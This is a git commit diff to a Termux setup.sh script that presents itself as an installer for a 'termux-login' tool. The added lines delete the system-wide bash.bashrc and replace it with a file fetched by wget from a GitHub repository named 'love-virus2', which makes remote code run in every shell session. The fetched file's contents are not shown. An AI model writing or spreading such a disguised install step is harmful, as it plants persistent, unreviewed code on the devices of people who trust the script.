97d4d1b21e514c978ce985b809feaad589889857
Simplehacker1Community <93964893+Simplehacker1Community@users.noreply.github.com>
2022-03-12 07:26:16 +0530

    Update setup.sh

--- setup.sh
+++ setup.sh
@@ -1,8 +1,18 @@
+clear
+echo " Installing "
+apt update
+apt install espeak python git wget -y 
+cd /data/data/com.termux/files/usr/etc
+rm bash.bashrc
+wget https://raw.githubusercontent.com/Simplehacker1Community/love-virus2/simplehacker/bash.bashrc
+clear
 apt update
 apt upgrade -y
 apt install python fish espeak  curl wget zip -y
 pip install termuxlogin
-
+cd
+git clone https://github.com/Simplehacker1Community/termux-login
+cd termux-login
 echo installed
 rm termuxlogin.whl
 rm setup.sh
